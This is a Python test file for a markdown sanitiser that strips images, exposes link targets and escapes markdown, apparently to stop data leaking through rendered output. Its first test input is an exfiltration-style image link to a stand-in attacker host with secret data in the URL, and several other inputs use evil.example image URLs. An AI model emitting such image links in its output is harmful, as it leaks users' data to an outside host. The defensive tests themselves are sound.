import pytest

from palimpsest.markdown_safety import escape_markdown, neutralize_markdown


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("See ![chart](https://evil.example/p?d=secret).", "See (image removed: chart)."),
        ("![](https://evil.example/x.png)", "(image removed)"),
        ("Logo: ![logo][1]\n\n[1]: https://evil.example/x.png", "Logo: (image removed: logo)"),
    ],
)
def test_images_are_removed(text: str, expected: str) -> None:
    result = neutralize_markdown(text)

    assert result.startswith(expected)
    assert "![" not in result


def test_links_show_their_target() -> None:
    result = neutralize_markdown("Read [the docs](https://example.com/guide) first.")

    assert result == "Read the docs (https://example.com/guide) first."


def test_ordinary_formatting_is_kept() -> None:
    text = "**Bold** answer [1].\n\n- item\n\n```python\nprint('hi')\n```"

    assert neutralize_markdown(text) == text


def test_escaped_text_contains_no_live_markdown() -> None:
    escaped = escape_markdown("![x](https://evil.example) **bold** report_v2.pdf")

    assert escaped == (r"\!\[x\]\(https://evil\.example\) \*\*bold\*\* report\_v2\.pdf")
